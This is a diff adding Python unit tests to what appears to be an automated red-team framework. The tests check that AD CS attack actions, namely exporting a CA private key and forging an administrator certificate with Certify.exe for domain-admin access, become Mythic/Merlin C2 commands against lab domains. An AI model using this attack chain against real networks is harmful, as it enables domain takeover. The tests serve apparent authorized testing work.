+        target="target=ca01;target_domain=lab.local;callback=8",
+        preconditions=[
+            "remote-exec:ca01@lab.local",
+            "local-admin:ca01@lab.local",
+            "live-callback:8",
+        ],
+        effects=[
+            "adcs-ca-private-key:ca01@lab.local",
+            "adcs-ca:ca01@lab.local",
+        ],
+        intent={
+            "capability": "adcs-ca-private-key-export",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "8",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "Correct Horse 'Battery' Staple!",
+        "pfx_password": "Pfx 'Secret'!",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["rev2Self", "run"]
+    reset, command = mythic_plan.commands
+    assert reset.parameters == {}
+    assert reset.expected_probe == ""
+    assert command.parameters["executable"] == "powershell.exe"
+    assert command.expected_probe == "extract_adcs_ca_private_key_probe"
 
 
 def test_adapter_translates_adcs_ca_export_to_current_context_powerpick():
@@ -1472,6 +2135,104 @@ def test_adapter_can_explicitly_use_legacy_forgecert_backend():
     assert '--CaCertPassword "CA Secret!"' in forge_args
     assert "--SubjectAltName administrator@lab.local" in forge_args
     assert "--NewCertPath C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in forge_args
+
+
+def test_merlin_adapter_fails_closed_when_certify_arguments_exceed_runner_limit():
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
+        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
+        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
+        intent={
+            "capability": "adcs-certificate-auth",
+            "domain": "essos.local",
+            "account": "administrator",
+            "ca_host": "braavos",
+            "callback_id": "2",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_essos_local_2.pfx",
+        "ca_pfx_password": "X" * 32,
+        "account_sid": "S-1-5-21-111111111-222222222-333333333-500",
+        "proof_host": "meereen.essos.local",
+        "dc": "meereen.essos.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is False
+    assert mythic_plan.missing == ["dotnet_argument_transport"]
+    assert "exceed the configured runner transport limit" in mythic_plan.reason
+
+
+def test_merlin_adapter_keeps_compact_certify_paths_on_one_step_runner():
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
+        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
+        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
+        intent={
+            "capability": "adcs-certificate-auth",
+            "domain": "essos.local",
+            "account": "administrator",
+            "ca_host": "braavos",
+            "callback_id": "2",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "ca_pfx_path": r".\c",
+        "ca_pfx_password": "X" * 20,
+        "account_sid": "S-1-5-21-111111111-222222222-333333333-500",
+        "forged_pfx_path": r".\f",
+        "proof_host": "meereen.essos.local",
+        "dc": "meereen.essos.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    forge = next(command for command in mythic_plan.commands if command.operation == "adcs-certificate-forge")
+    assert forge.command == "execute-assembly"
+    assert forge.parameters["filename"] == "Certify.exe"
+    assert r"--ca-cert .\c" in forge.parameters["arguments"]
+    assert r"--output-path .\f" in forge.parameters["arguments"]
+    assert "--subject" not in forge.parameters["arguments"]
+    assert "--crl ldap:///" in forge.parameters["arguments"]
+    assert len(forge.parameters["arguments"].encode("utf-8")) <= 255
+
+
+def test_dotnet_adapter_without_runner_limit_keeps_long_certify_on_one_step_runner():
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
+        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
+        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
+        intent={
+            "capability": "adcs-certificate-auth",
+            "domain": "essos.local",
+            "account": "administrator",
+            "ca_host": "braavos",
+            "callback_id": "2",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_essos_local_2.pfx",
+        "ca_pfx_password": "X" * 32,
+        "account_sid": "S-1-5-21-111111111-222222222-333333333-500",
+        "proof_host": "meereen.essos.local",
+        "dc": "meereen.essos.local",
+    })
+    config = dict(adapter.MERLIN_MYTHIC_ADAPTER)
+    config.pop("dotnet_runner_max_argument_bytes")
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)
+
+    assert mythic_plan.ok is True
+    forge = mythic_plan.commands[2]
+    assert forge.command == "execute-assembly"
+    assert forge.parameters["filename"] == "Certify.exe"
+    assert len(forge.parameters["arguments"].encode("utf-8")) > 255
 
 
 def test_adapter_translates_adcs_certificate_auth_to_schannel_ldap_proof():
